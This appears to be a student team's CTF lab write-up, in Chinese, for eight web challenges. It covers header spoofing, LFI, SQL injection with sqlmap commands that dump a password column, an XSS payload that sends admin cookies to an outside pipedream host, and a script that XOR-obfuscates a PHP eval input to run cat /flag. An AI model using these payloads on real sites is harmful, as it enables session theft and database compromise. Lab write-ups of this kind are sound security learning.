# CTF Project 3

Created: May 6, 2022 10:32 PM

# Team

- 第 7 組
- 7777777

---

# 1. pekora

## Writeup

這題在考 X-Forwarded-For

首先我們先看原始碼，可以看到圖片的alt，先把他 Base64 decode ，可以得到 flag 的前半段

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled.png)

透過題目的提示，我們透過在 Header 新增一個 Key: X-Forwarded-For, Value: 127.0.0.1，並重新傳送 Request，就可以得到 flag 的後半段。

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%201.png)

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%202.png)

然後我們可以看到 Set-Cookies 有一個 _flags ，合理推斷這是 flag 的中間，接著把這三個接起來就是 flag。

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%203.png)

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%204.png)

---

# 2. checkcheck

## Writeup

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%205.png)

看原始碼可以發現你打帳號密碼之後按 send 會去 POST "[http://ctf.adl.tw:12002/flag](http://ctf.adl.tw:12002/flag)"

如果你今天輸入 admin 00000000 會因為 HTML 的 code 被擋掉

所以我們就用 Network tool 直接更改 request 內容就拿到 flag 了

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%206.png)

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%207.png)

---

# 3. aqua

## Writeup

看 robots.txt 可以發現關鍵的檔案

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%208.png)

我們下載 `.admin_backend.php.swp`

用 vim -r 去找出他原始碼

可以找到帳號密碼是多少

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%209.png)

之後我們去請求並把帳號密碼打在後面就拿到 flag

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2010.png)

---

# 4. ****Hololive EN I****

## Writeup

1. 這題有很多不同的Page，所以我們使用LFI的想法解題
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2011.png)
    
2. 用路徑爆破工具+通靈找到login.php
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2012.png)
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2013.png)
    
3. 透過PHP Filter查PHP原始碼，並且編碼為Base64
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2014.png)
    
4. 將PHP解碼回utf8，並且得到flag
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2015.png)
    

---

# 5. ****Hololive EN II****

## Writeup

1. 同第4題先進入到login.php
2. 用sql injection
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2016.png)
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2017.png)
    

---

# 6. ****Hololive EN III****

## Writeup

1. 同第4題先進入到login.php
2. 透過第5題的提示可以知道 flag 是 gura 的密碼
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2017.png)
    
3. 用 sqlmap 這個工具慢慢把 password leak 出來就拿到 flag 了
    
    查有哪些 databases:
    
    `python [sqlmap.py](http://sqlmap.py/) -u [https://holoen.ctf.adl.tw/login.php](https://holoen.ctf.adl.tw/login.php) --forms --dbs`
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2018.png)
    
    查某個 database 有哪些 tables
    
    `python [sqlmap.py](http://sqlmap.py/) -u [https://holoen.ctf.adl.tw/login.php](https://holoen.ctf.adl.tw/login.php) --forms -D ctf_users --tables`
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2019.png)
    
    查某個 databases 中某個 table 有哪些欄位
    
    `python sqlmap.py -u https://holoen.ctf.adl.tw/login.php --forms -D ctf_users -T users --columns`
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2020.png)
    
    把某個欄位的資料都 dump 出來
    
    `python sqlmap.py -u https://holoen.ctf.adl.tw/login.php --forms -D ctf_users -T users -C password --dump`
    
    ![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2021.png)
    

---

# 7. msg_board

## Writeup

考XSS

admin會一直重複來看這個留言板

所以我們要想辦法偷到admin的cookie

我們先去創一個webserver

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2022.png)

然後我們在留言板打我們的payload

因為<script>跟<img>都被擋掉了

所以就使用<image>

```jsx
<image src=x onerror=this.src='https://eo1csyx4f9imvkz.m.pipedream.net/?'+document.cookie;>
```

![[當圖片不存在時，會執行onerror裡面的script](https://blog.csdn.net/qq_37899792/article/details/90369134)](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2023.png)

[當圖片不存在時，會執行onerror裡面的script](https://blog.csdn.net/qq_37899792/article/details/90369134)

接著就拿到flag了

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2024.png)

Reference: 

[WebHacking101/xss-reflected-steal-cookie.md at master · R0B1NL1N/WebHacking101](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)

---

# 8. bee

## Writeup

從 source code 可以看到是考 regex bypass 

```php
if(isset($_POST["num"])) 
    {
        $wl = preg_match('/^[0-9\?\@\+\-\*\/\(\)\'\.\~\^\|\&\\\\\"\_[\] ]+$/i', $_POST["num"]);
        if($wl === 0 || strlen($_POST["num"]) > 100) {
            die("<a href='https://www.youtube.com/watch?v=SQb-bNedGpQ' target=_blank >Bye-Bye <3</a>");
        }

        echo 'Result: ';
        
        eval("echo ".eval("return ".$_POST["num"].";").";");
    }
    ?>
```

因為有正則表達式的限制，我們必須利用 xor 去組合出我們想要的字串

```python
string_code = ['`cat /flag`', ]
obfuscated_code = ""
charset = "0123456789?@+-*/()'.~^|&_[] "

for code in string_code:
    obfuscated = ""
    for i in code:
        is_found_obfuscated = False
        for j in charset:
            for k in charset:
                if ord(j) ^ ord(k) == ord(i):
                    is_found_obfuscated = True
                    obfuscated += ".('%s'^'%s')" % (j, k)
                    # print("XOR ="+chr(ord(j) ^ ord(k)))
                if is_found_obfuscated:
                    break
            if is_found_obfuscated:
                break
        if not is_found_obfuscated:
            obfuscated += ".'%s'" % i
    # print("(%s) = (%s)" % (code, obfuscated[1:]))
    obfuscated_code += "(%s)" % obfuscated[1:]
print(''.join(["(\"%s\")" % i for i in string_code]) + '=' + obfuscated_code)
print(len(''.join(["(\"%s\")" % i for i in string_code]) +
      '=' + obfuscated_code))
```

一開始我們使用 `ls`，發現 flag 並不在這

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2025.png)

我們輸入 `ls /`，發現 flag

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2026.png)

輸入 `cat /flag`，拿到 flag

![Untitled](CTF%20Project%203%2018e205b1a9a0401eb24c7d9a610bc792/Untitled%2027.png)